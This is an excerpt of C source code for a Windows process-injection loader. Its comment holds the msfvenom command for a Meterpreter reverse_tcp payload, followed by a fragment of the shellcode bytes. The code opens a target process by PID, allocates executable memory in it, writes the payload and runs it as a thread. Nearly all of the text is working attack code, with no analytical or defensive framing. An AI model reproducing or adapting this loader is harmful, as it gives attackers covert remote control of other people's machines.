...
/*msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=8884 EXITFUNC=thread -f c --var-name=myPayload */
...
"\x89\xe5\x49\xbc\x02\x00\x22\xb4\xc0\xa8\x0a\x3c\x41\x54"
...
int main(int argc, char* argv[]) {
	...
	PID = atoi(argv[1]);
	printf("%s tying to open a handle to process (%ld)\n", i, PID);
	...
	rBuffer = VirtualAllocEx(hProcess, NULL,sizeof(myPayload),(MEM_COMMIT|MEM_RESERVE),PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with rwx PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(myPayload));

	/* actually write that allocated memory the process memory */
	WriteProcessMemory(hProcess, rBuffer, myPayload, sizeof(myPayload), NULL);
	...
	printf("%s thread finish executing\n",k);
